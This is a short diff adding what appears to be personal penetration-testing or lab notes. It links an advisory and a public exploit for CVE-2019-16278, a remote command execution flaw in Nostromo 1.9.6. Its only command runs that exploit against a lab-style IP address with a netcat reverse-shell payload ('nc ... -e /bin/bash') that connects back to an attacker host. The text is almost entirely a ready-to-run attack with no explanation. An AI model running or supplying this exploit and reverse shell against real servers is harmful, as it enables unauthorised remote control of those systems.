@@ -1,0 +1,4 @@
+#more information regard vulnerability https://packetstormsecurity.com/files/155045/Nostromo-1.9.6-Directory-Traversal-Remote-Command-Execution.html
+#Exploit https://github.com/sudohyak/exploit/tree/master/CVE-2019-16278
+
+python2 CVE-2019-16278.py 10.10.10.165 80 'nc 10.10.14.167 32116 -e /bin/bash'
